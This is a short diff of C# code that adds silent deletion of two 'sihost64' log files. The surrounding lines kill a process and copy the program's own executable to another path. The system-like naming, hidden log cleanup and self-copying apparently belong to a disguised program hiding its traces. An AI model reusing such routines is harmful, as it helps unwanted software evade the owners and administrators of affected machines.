@@ -82,6 +82,16 @@ public partial class Program
                 proc.Kill();
             }
 
+            try
+            {
+                File.Delete(Path.Combine(bD, "sihost64.log"));
+            } catch(Exception ex) {}
+
+            try
+            {
+                File.Delete(Path.Combine(bD, "sihost64-2.log"));
+            } catch(Exception ex) {}
+
             File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
             Thread.Sleep(5 * 1000);
             RBaseFolder();
